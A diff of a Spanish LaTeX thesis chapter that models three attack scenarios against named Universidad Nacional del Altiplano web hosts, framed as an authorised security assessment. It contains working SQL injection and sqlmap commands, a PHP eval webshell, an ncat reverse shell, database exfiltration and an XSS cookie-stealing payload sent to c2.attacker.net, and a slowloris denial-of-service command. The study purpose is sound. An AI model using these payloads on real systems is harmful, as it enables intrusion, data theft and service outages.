@@ -1,7 +1,7 @@
 \chapter{Desarrollo y Aplicación Práctica}
 \label{ch:aplicacion_practica}
 
-A continuación, se desarrolla la evaluación experimental y el modelado sistemático sobre la infraestructura web seleccionada de la UNAP.
+A continuación, se desarrolla la evaluación experimental y el modelado sistemático sobre la infraestructura web seleccionada de la Universidad Nacional del Altiplano (UNAP).
 
 \section{Reconocimiento del Entorno Autorizado}
 El proceso de evaluación inició con la recolección de información pública y la identificación de la superficie expuesta en el dominio institucional \texttt{unap.edu.pe}. Esta etapa permite conocer la topología lógica sin enviar paquetes invasivos ni generar alertas de intrusión.
@@ -109,103 +109,86 @@ A04 (API) & E & Escalado de privilegios de usuario estándar a administrador ví
 \end{longtable}
 \end{center}
 
-\section{Construcción de Escenarios de Ataque}
+\section{Construcción y Modelado de Escenarios de Ataque}
 A partir de las amenazas priorizadas en el modelo STRIDE, se formalizaron tres escenarios representativos de intrusión para la UNAP:
 
-\begin{itemize}
-    \item \textbf{Escenario 1 (Exfiltración y Alteración en el SIA):} Un atacante externo identifica una inyección SQL en el portal del SIA (\texttt{sia.unap.edu.pe}), exfiltra hashes de credenciales de administradores y altera registros de notas.
-    \item \textbf{Escenario 2 (Compromiso del Campus Virtual Moodle vía XSS y Phishing):} Un actor malicioso inserta un script XSS persistente en un foro del aula virtual (\texttt{vcampus.unap.edu.pe}) para capturar cookies de sesión de docentes.
-    \item \textbf{Escenario 3 (Denegación de Servicio en Admisión vía HTTP Flood):} Un grupo cibercriminal satura la pasarela de inscripciones de admisión (\texttt{admision.unap.edu.pe}) durante la última hora de inscripción.
-\end{itemize}
+\subsection{Escenario 1: Exfiltración de Base de Datos y Alteración en el SIA vía SQLi}
+Este escenario modela a un atacante externo que explota una inyección SQL ciega en el módulo de consulta del SIA (\texttt{sia.unap.edu.pe}), obtiene credenciales de administrador y deposita una webshell para exfiltrar las bases de datos.
 
-\section{Desglose y Aplicación de Cyber Kill Chain}
-A continuación, se desarrolla el desglose técnico del \textbf{Escenario 1 (Ataque al SIA)}, mapeando cada una de las siete fases de la Cyber Kill Chain e ilustrando las acciones y contramedidas mediante consolas de auditoría.
+\subsubsection{Fases de la Cyber Kill Chain (Escenario 1)}
+\begin{enumerate}
+    \item \textbf{Reconocimiento:} Escaneo de puertos y servicios con Nmap sobre \texttt{sia.unap.edu.pe}.
+    \item \textbf{Armamento:} Construcción de carga útil de inyección SQL booleana para volcado de usuarios.
+    \item \textbf{Entrega:} Envío del payload malicioso vía peticiones POST parametrizadas.
+    \item \textbf{Explotación:} Ejecución de consultas no sanitizadas en la base de datos PostgreSQL.
+    \item \textbf{Instalación:} Carga de una webshell criptográfica en el directorio \texttt{/uploads/}.
+    \item \textbf{Comando y Control (C2):} Conexión inversa cifrada por el puerto 443 hacia la IP del atacante.
+    \item \textbf{Acciones sobre el Objetivo:} Extracción del volcado \texttt{dump\_unap\_sia.sql} y alteración de notas.
+\end{enumerate}
 
-\subsection{Fase 1: Reconocimiento (Reconnaissance)}
-El adversario recopila información pasiva y ejecuta un escaneo de puertos y servicios sobre la infraestructura del SIA:
-
-\begin{cmdbox}{Fase 1: Reconocimiento de Puertos y Servicios (Nmap)}
-nmap -sV -sC -p 80,443,8080 sia.unap.edu.pe -oN scan_recon_sia.txt
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for sia.unap.edu.pe (200.48.xxx.xxx)
-PORT     STATE SERVICE     VERSION
-80/tcp   open  http        nginx 1.20.1
-|_http-title: Redireccion a HTTPS
-443/tcp  open  ssl/http    nginx 1.20.1
-|_http-server-header: nginx/1.20.1
-| ssl-cert: Subject: commonName=sia.unap.edu.pe
-8080/tcp open  http-proxy  Apache Tomcat/9.0.41 (Testing Service)
-\end{cmdbox}
-
-\subsection{Fase 2: Armamento (Weaponization)}
-El atacante descubre un formulario de consulta pública de egresados vulnerable a inyección SQL de tipo booleana / ciega. Prepara un script automatizado en Python para extraer la estructura de la base de datos PostgreSQL:
-
-\begin{cmdbox}{Fase 2: Construcción del Payload de Inyección SQL (PoC)}
-# Carga util armada para extraccion ciega en parametro 'id_alumno'
-PAYLOAD = "' UNION SELECT NULL, username || ':' || password_hash, NULL FROM public.usuarios WHERE rol='ADMIN'--"
-\end{cmdbox}
-
-\subsection{Fase 3: Entrega (Delivery)}
-El atacante envía la carga útil maliciosa empaquetada a través del parámetro HTTP vulnerable mediante peticiones POST automatizadas:
-
-\begin{cmdbox}{Fase 3: Transmisión del Payload mediante Petición HTTP POST}
-curl -X POST https://sia.unap.edu.pe/api/consulta_alumno.php \
-     -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "id_alumno=1024' UNION SELECT NULL, version(), NULL--"
-\end{cmdbox}
-
-\subsection{Fase 4: Explotación (Exploitation)}
-El motor de base de datos PostgreSQL ejecuta la consulta maliciosa concatenada sin sanitizar, retornando la información confidencial de las tablas de usuarios y calificaciones:
-
-\begin{cmdbox}{Fase 4: Ejecución del Exploit de Extracción de Datos (SQLMap)}
+\begin{cmdbox}{Escenario 1: Ejecución de Explotación y Acceso Remoto (SQLMap + Ncat)}
+# 1. Extraccion automatizada con SQLMap
 sqlmap -u "https://sia.unap.edu.pe/api/consulta_alumno.php" \
        --data="id_alumno=1024" --dbs --batch --threads=4
-[INFO] the back-end DBMS is PostgreSQL
-[INFO] fetching database names
-available databases [3]:
-[*] db_sia_academico
-[*] db_tesoreria
-[*] postgres
-\end{cmdbox}
 
-\subsection{Fase 5: Instalación (Installation)}
-Haciendo uso de privilegios de escritura en el servidor web (obtenidos a través de la inyección SQL con comandos \texttt{COPY ... FROM PROGRAM}), el atacante deposita una interfaz de control remoto (\textit{Webshell}):
-
-\begin{cmdbox}{Fase 5: Persistencia mediante Carga de Webshell Criptográfica}
-# Escritura de Webshell en directorio web publico
-sqlmap -u "https://sia.unap.edu.pe/api/consulta_alumno.php" \
-       --data="id_alumno=1024" --os-shell
-os-shell> echo '<?php @eval($_POST["k"]); ?>' > /var/www/html/uploads/cache.php
-\end{cmdbox}
-
-\subsection{Fase 6: Comando y Control (C2)}
-El atacante establece una conexión inversa (\textit{Reverse Shell}) cifrada hacia un servidor exterior en la nube, evadiendo los controles de tráfico de entrada:
-
-\begin{cmdbox}{Fase 6: Establecimiento de Canal de Retorno C2 (Reverse Shell)}
-# En el servidor atacante escuchando por puerto 443
+# 2. Establecimiento de Reverse Shell en servidor C2
 ncat -lvnp 443
-Ncat: Listening on 0.0.0.0:443 ...
-Ncat: Connection received from 200.48.xxx.xxx:51280.
-Linux sia-unap-prod 5.4.0-89-generic (Ubuntu SMP x86_64)
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-whoami
-www-data
+Connection received from 200.48.xxx.xxx:51280.
+uid=33(www-data) gid=33(www-data)
+whoami && pg_dump -U postgres -h localhost db_sia_academico > dump_sia.sql
 \end{cmdbox}
 
-\subsection{Fase 7: Acciones sobre el Objetivo (Actions on Objectives)}
-Con acceso a la consola y a las bases de datos internas, el adversario ejecuta la extracción masiva de actas y tablas de notas, o manipula registros individuales:
+\subsection{Escenario 2: Secuestro de Sesión Docente en el Campus Virtual vía Stored XSS}
+Este escenario modela a un alumno malicioso que inyecta código JavaScript malicioso en un foro de discusión de Moodle (\texttt{vcampus.unap.edu.pe}). Cuando el docente revisa el foro, el script se ejecuta en su navegador y transmite su cookie de sesión al servidor del atacante.
 
-\begin{cmdbox}{Fase 7: Exfiltración de Base de Datos y Alteración de Registros}
-pg_dump -U postgres -h localhost db_sia_academico > dump_unap_sia.sql
-gzip -c dump_unap_sia.sql | base64 | curl -X POST -d @- https://c2.attacker.net/exfil
+\subsubsection{Fases de la Cyber Kill Chain (Escenario 2)}
+\begin{enumerate}
+    \item \textbf{Reconocimiento:} Inspección del editor de texto enriquecido en los foros del Campus Virtual.
+    \item \textbf{Armamento:} Creación de un script JavaScript ofuscado que capture \texttt{document.cookie}.
+    \item \textbf{Entrega:} Publicación del mensaje en el foro con la etiqueta \texttt{<script>} oculta en una imagen.
+    \item \textbf{Explotación:} El navegador del docente renderiza el HTML y ejecuta el payload de forma invisible.
+    \item \textbf{Instalación:} Inyección de un escuchador en el DOM para capturar credenciales adicionales.
+    \item \textbf{Comando y Control:} El script envía la cookie \texttt{MoodleSession} vía HTTP GET al atacante.
+    \item \textbf{Acciones sobre el Objetivo:} El atacante clona la sesión, ingresa como docente y aprueba exámenes.
+\end{enumerate}
+
+\begin{cmdbox}{Escenario 2: Payload XSS y Servidor de Captura de Cookies}
+# Payload inyectado en el cuerpo del mensaje del foro:
+<img src="x" onerror="fetch('https://c2.attacker.net/log?c='+btoa(document.cookie))">
+
+# Registro capturado en el servidor del atacante:
+[HTTP GET] /log?c=TW9vZGxlU2Vzc2lvbj1kOTBhOGY0YzFlNmIzMDEyOWE...
+[+] Cookie decodificada: MoodleSession=d90a8f4c1e6b30129a; User=Docente_Titular
+\end{cmdbox}
+
+\subsection{Escenario 3: Denegación de Servicio en Admisión vía HTTP Slowloris}
+Un grupo de ciberatacantes lanza un ataque de agotamiento de recursos en la capa de aplicación (Layer 7) contra la pasarela de pagos de admisión (\texttt{admision.unap.edu.pe}) durante la última hora del cronograma de inscripciones.
+
+\subsubsection{Fases de la Cyber Kill Chain (Escenario 3)}
+\begin{enumerate}
+    \item \textbf{Reconocimiento:} Determinación de los límites de timeout del servidor Apache/Nginx.
+    \item \textbf{Armamento:} Configuración de una botnet ligera con la herramienta \texttt{slowloris.py}.
+    \item \textbf{Entrega:} Envío de miles de peticiones HTTP con cabeceras incompletas enviadas lentamente.
+    \item \textbf{Explotación:} Agotamiento de la tabla de conexiones y del pool de \textit{workers} de Nginx.
+    \item \textbf{Instalación / Persistencia:} Mantenimiento periódico del flujo para evitar que los sockets se liberen.
+    \item \textbf{C2:} Coordinación de los nodos atacantes mediante un canal IRC / Telegram bot.
+    \item \textbf{Acciones sobre el Objetivo:} Caída del portal de admisión (\textit{HTTP 504 Gateway Timeout}), impidiendo el pago y registro de postulantes.
+\end{enumerate}
+
+\begin{cmdbox}{Escenario 3: Simulación de Ataque DoS de Agotamiento de Conexiones}
+# Ejecucion del ataque Slowloris contra el puerto HTTPS
+slowloris admision.unap.edu.pe -p 443 -s 1500 --sleeptime 10
+
+[INFO] Sending keep-alive headers to 1500 sockets...
+[WARNING] Target server response time degraded: > 12000 ms
+[ALERT] Server returned HTTP 504 Gateway Timeout / Server Unavailable
 \end{cmdbox}
 
 \section{Análisis de Controles Existentes y Brechas de Seguridad}
-El desglose de la Cyber Kill Chain demuestra que la intrusión se pudo materializar debido a la ausencia de defensas en capas clave:
-
+El desglose de los tres escenarios demuestra que la infraestructura presenta brechas en cuatro niveles fundamentales:
 \begin{itemize}
-    \item \textbf{Brecha en Fase de Entrega/Explotación:} Falta de un Web Application Firewall (WAF) que bloquee firmas de inyección SQL en la capa 7.
-    \item \textbf{Brecha en Fase de Explotación:} Código legado en PHP con consultas concatenadas en lugar de consultas parametrizadas con PDO/PostgreSQL.
-    \item \textbf{Brecha en Fase de C2:} Ausencia de filtrado de tráfico saliente (\textit{Egress Filtering}) en el firewall perimetral, permitiendo conexiones salientes arbitrarias por puertos como el 443.
-    \item \textbf{Brecha en Fase de Instalación:} Permisos de escritura excesivos para el usuario del servidor web (\texttt{www-data}) en directorios públicos.
+    \item \textbf{Falta de WAF y Reglas de Sanitización:} Permite el paso directo de firmas SQLi y XSS.
+    \item \textbf{Ausencia de Flag HttpOnly / SameSite:} Facilita la exfiltración de cookies por scripts JavaScript.
+    \item \textbf{Inexistencia de Rate Limiting:} Permite el secuestro de sockets y ataques DoS de capa 7.
+    \item \textbf{Falta de Egress Filtering:} Permite a servidores web establecer conexiones salientes a Internet no restringidas.
 \end{itemize}
